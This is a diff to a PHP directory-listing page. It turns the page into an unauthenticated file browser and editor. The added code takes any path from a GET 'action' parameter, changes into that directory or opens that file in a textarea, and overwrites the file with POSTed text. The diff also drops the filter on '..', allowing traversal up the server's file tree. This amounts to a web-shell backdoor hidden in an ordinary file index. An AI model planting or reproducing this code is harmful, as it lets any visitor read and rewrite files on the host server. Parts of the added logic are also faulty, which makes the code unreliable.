@@ -4,7 +4,6 @@
     $ignore_ext_list = array( );
     $sort_by = "name_asc";
     $icon_url = "https://image.flaticon.com/icons/svg/833/833524.svg";
-    $toggle_sub_folders = true;
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
@@ -35,6 +34,12 @@
             background: white; 
             padding: 40px; 
             box-shadow: 0 0 2px #ccc; 
+        }
+        textarea {
+            width:100%;
+            height:350px;
+            background: white;
+            outline:none;
         }
         @media only screen and (max-width: 700px) { 
             .wrap { 
@@ -152,8 +157,14 @@
 <body>
 <div class="wrap">
 <?php
-if (isset($_GET['dir'])) {
-    chdir($_GET['dir']);
+if (isset($_GET['action'])) {
+    if (is_dir($_GET['action'])) {
+        chdir($_GET['action']);
+    } else {
+        if (is_file($_GET['action'])) {
+            edit($_GET['action'], "edit");
+        }
+    }
 }
 function cleanTitle($title) {
     return ucwords( str_replace( array("-", "_"), " ", $title) );
@@ -230,12 +241,57 @@ function permission($file, $perms) {
     }
 }
 
+function refresh($url, $file){
+    ?> <script type="text/javascript">window.location='?<?=$url?>=<?=getcwd().DIRECTORY_SEPARATOR.$file?>'</script> <?php
+}
+
+function save($file, $text) {
+    $handle = fopen($file, "w");
+    fwrite($handle, $text);
+    fclose($handle);
+}
+
 function size($file) {
     if (is_dir($file)) {
         $filename = "";
     } elseif (is_file($file)) {
         $filename = "Size : ".format_size($file);
     } return $filename;
+}
+
+function getUrl($file) {
+    if (is_writable($file)) {
+        print "?action=".getcwd().DIRECTORY_SEPARATOR.$file."";
+    } else {
+        die("Not writable");
+    }
+}
+
+function edit($file, $action = false) {
+    switch ($action) {
+        case 'edit':
+            ?>
+            <div class="block">
+                <center><h1>EDIT</h1></center>
+                Filename : <?= permission($file, basename($file))  ?> <br><br>
+                <form method="post">
+                    <textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
+                    <input style="width: 100%;" type="submit" name="submit">
+                </form>
+            </div>
+            <?php
+            if (isset($_POST['submit'])) {
+                if (save($file, $_POST['text'])) {
+                    print("failed");
+                } else {
+                    refresh("action", $file);
+                    print("success");
+                }
+            }
+            exit();
+            break;
+    }
+    
 }
 
 function display_block( $files ) {
@@ -253,7 +309,7 @@ function display_block( $files ) {
 
     ?>
     <div class=block>
-    <a href="<?= basename($file) ?>" class="<?= $file_ext ?>">
+    <a href="<?= getUrl(basename($file)) ?>" class="<?= $file_ext ?>">
         <div class="img"><img width="50px" height="50px" src="<?= ext($file) ?>"></div>
         <div class="name">
             <div class="file"><?= basename($file) ?>
@@ -262,7 +318,7 @@ function display_block( $files ) {
                         <tr>
                             <td><?= size($file) ?></td>
                             <td><?= permission($file, perms($file)) ?></td>
-                            <td><?= date("D. F jS, Y - h:ia", filemtime($file)) ?></td>
+                            <td><?= date("m.y.d - h:ia", filemtime($file)) ?></td>
                         </tr>
                     </table>
                 </div>
@@ -274,13 +330,13 @@ function display_block( $files ) {
 }
 
 function build_blocks( $items, $folder ) {
-    global $ignore_file_list, $ignore_ext_list, $sort_by, $toggle_sub_folders;
+    global $ignore_file_list, $ignore_ext_list, $sort_by;
     $objects = array();
     $objects['directories'] = array();
     $objects['files'] = array();
 
     foreach($items as $c => $item) {
-        if( $item == ".." OR $item == ".") continue;
+        if($item == ".") continue;
         if(in_array($item, $ignore_file_list)) {
             continue;
         }
@@ -295,32 +351,13 @@ function build_blocks( $items, $folder ) {
             $objects['directories'][] = $item;
             continue;
         }
-        $file_time = date("U", filemtime($item));
+        $file_time = date("U", @filemtime($item));
         $objects['files'][$file_time . "-" . $item] = $item;
     }
 
-    foreach($objects['directories'] as $c => $file) {
+    foreach($objects['directories'] as $file) {
         display_block( $file );
-        if($toggle_sub_folders) {
-            $sub_items = (array) scandir( $file );
-            if( $sub_items ) {
-                echo "<div class='sub' data-folder=\"$file\">";
-                build_blocks( $sub_items, $file );
-                echo "</div>";
-            }
-        }
     }
-
-    if( $sort_by == "date_asc" ) {
-        ksort($objects['files']);
-    } elseif( $sort_by == "date_desc" ) {
-        krsort($objects['files']);
-    } elseif( $sort_by == "name_asc" ) {
-        natsort($objects['files']);
-    } elseif( $sort_by == "name_desc" ) {
-        arsort($objects['files']);
-    }
-
     foreach($objects['files'] as $t => $file) {
         $fileExt = getFileExt($file);
         if(in_array($file, $ignore_file_list)) {
@@ -334,17 +371,6 @@ function build_blocks( $items, $folder ) {
 $items = scandir( getcwd() );
 build_blocks( $items, false );
 ?>
-
-<?php if($toggle_sub_folders) { ?>
-<script>
-    $(document).ready(function() {
-        $("a.dir").click(function(e) {
-            $('.sub[data-folder="' + $(this).attr('href') + '"]').slideToggle();
-            e.preventDefault();
-        });
-    });
-</script>
-<?php } ?>
 </div>
 </body>
 </html>
